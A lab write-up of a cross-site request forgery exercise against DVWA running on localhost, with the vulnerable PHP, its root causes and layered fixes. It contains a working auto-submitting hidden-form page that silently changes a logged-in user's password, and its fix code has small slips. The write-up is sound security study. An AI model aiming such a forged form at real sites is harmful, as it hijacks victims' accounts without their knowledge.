\# 05 - CSRF (DVWA, Low Security)



\## What I did

Navigated to the CSRF module in DVWA — a password change form requiring a new

password and confirmation. While logged into DVWA as `admin`, created a separate

HTML file (`csrf-poc.html`) containing a hidden auto-submitting form targeting

the DVWA password change endpoint:



```html

<html>

<body>

<form action="http://localhost/dvwa/vulnerabilities/csrf/" method="GET">

&#x20; <input type="hidden" name="password\_new" value="hacked123">

&#x20; <input type="hidden" name="password\_conf" value="hacked123">

&#x20; <input type="hidden" name="Change" value="Change">

</form>

<script>document.forms\[0].submit()</script>

</body>

</html>

```



Opened this file in the browser while the DVWA session was still active in

another tab. The form auto-submitted silently with no user interaction.



\## What happened

The DVWA admin password changed to `hacked123` without any confirmation,

re-authentication prompt, or visible interaction from the victim. Verified

by logging out and logging back in successfully with the new password.



!\[CSRF Result](./screenshots/csrf-result.png)



\## Root cause

The password change endpoint accepts GET requests and relies solely on the

session cookie for authentication — no CSRF token, no re-authentication check,

no origin validation:



```php

if( isset( $\_GET\[ 'Change' ] ) ) {

&#x20;   $pass\_new  = $\_GET\[ 'password\_new' ];

&#x20;   $pass\_conf = $\_GET\[ 'password\_conf' ];



&#x20;   if( $pass\_new == $pass\_conf ) {

&#x20;       $pass\_new = md5( $pass\_new );

&#x20;       $current\_user = dvwaCurrentUser();

&#x20;       $insert = "UPDATE `users` SET password = '$pass\_new'

&#x20;                  WHERE user = '" . $current\_user . "';";

&#x20;       $result = mysqli\_query($GLOBALS\["\_\_\_mysqli\_ston"], $insert);

&#x20;       echo "<pre>Password Changed.</pre>";

&#x20;   }

}

```



Three compounding problems in this code:



\*\*1. No CSRF token\*\*

The form accepts any request that includes valid GET parameters — it never

checks whether the request originated from DVWA's own page or from an

external attacker-controlled page. Any site can silently trigger this

endpoint on behalf of an authenticated user just by having their browser

load a page with a matching form.



\*\*2. Sensitive operation over GET\*\*

Password changes should never use GET requests. GET parameters appear in

browser history, server access logs, referrer headers, and proxy logs —

meaning the new password could be inadvertently logged in plaintext across

multiple systems. POST should be used for any state-changing operation.



\*\*3. No re-authentication\*\*

The endpoint changes the password without asking for the current password

first. An attacker who briefly gains access to an authenticated session

(via XSS cookie theft, network interception, or a shared computer) can

permanently lock the victim out of their account by changing the password

— even if the session itself expires shortly after.



\*\*4. MD5 for password hashing\*\*

`md5($pass\_new)` is used to hash the new password before storing it.

MD5 is cryptographically broken for password storage — it's fast, has

no salt, and is trivially reversible via rainbow tables or GPU cracking.

This is a separate vulnerability from CSRF but worth noting — the fix

for password storage is bcrypt, argon2, or scrypt.



\## How CSRF works — the browser trust model



The browser automatically attaches the victim's session cookie to any

request sent to `localhost` — regardless of which tab or page triggered

that request. This is the browser's intended behaviour for legitimate

same-site navigation. CSRF exploits this trust: the server sees a request

with a valid session cookie and assumes it came from a legitimate user

action, when in reality it was triggered silently by an attacker's page.



The victim never sees anything happen. The attack completes in milliseconds.



\## Code-level fix



\*\*Fix 1 — Implement anti-CSRF tokens (primary fix)\*\*



Generate a unique, unpredictable token per session and embed it as a hidden

field in every sensitive form. Validate the token server-side on every

submission — if it's missing or wrong, reject the request:



```php

// Generate token when rendering the form

$token = bin2hex(random\_bytes(32));

$\_SESSION\['csrf\_token'] = $token;



// In the form HTML

echo '<input type="hidden" name="csrf\_token" value="' . $token . '">';



// Validate on submission

if( $\_POST\['csrf\_token'] !== $\_SESSION\['csrf\_token'] ) {

&#x20;   die('Invalid CSRF token');

}

```



An attacker's page cannot read or predict the token because it's tied to

the victim's session and never exposed to cross-origin scripts (same-origin

policy prevents this).



\*\*Fix 2 — Switch to POST and require current password\*\*



```php

if( isset( $\_POST\[ 'Change' ] ) ) {

&#x20;   $pass\_current = $\_POST\[ 'password\_current' ];

&#x20;   $pass\_new     = $\_POST\[ 'password\_new' ];

&#x20;   $pass\_conf    = $\_POST\[ 'password\_conf' ];



&#x20;   // Verify current password before allowing change

&#x20;   // ... check current password against stored hash ...



&#x20;   if( $pass\_new == $pass\_conf \&\& $current\_password\_valid ) {

&#x20;       $pass\_new = password\_hash( $pass\_new, PASSWORD\_BCRYPT );

&#x20;       // ... update database ...

&#x20;   }

}

```



Requiring the current password means an attacker who triggers the endpoint

via CSRF gets nothing — they don't know the victim's current password, so

the change is rejected even if the request reaches the server.



\*\*Fix 3 — SameSite cookie attribute\*\*



Set the session cookie with `SameSite=Strict`:



```php

session\_set\_cookie\_params(\[

&#x20;   'samesite' => 'Strict',

&#x20;   'secure'   => true,

&#x20;   'httponly' => true,

]);

```



`SameSite=Strict` instructs the browser to never send the session cookie

on cross-site requests — the CSRF attack file would load but the request

would arrive at the server with no session cookie attached, so

`dvwaCurrentUser()` returns nothing and the password change fails.



\### Defence-in-depth summary

All three fixes should be applied together — CSRF tokens as the primary

control, POST + current password re-entry as a business logic control,

and SameSite=Strict as a browser-level backstop. No single control is

sufficient on its own.

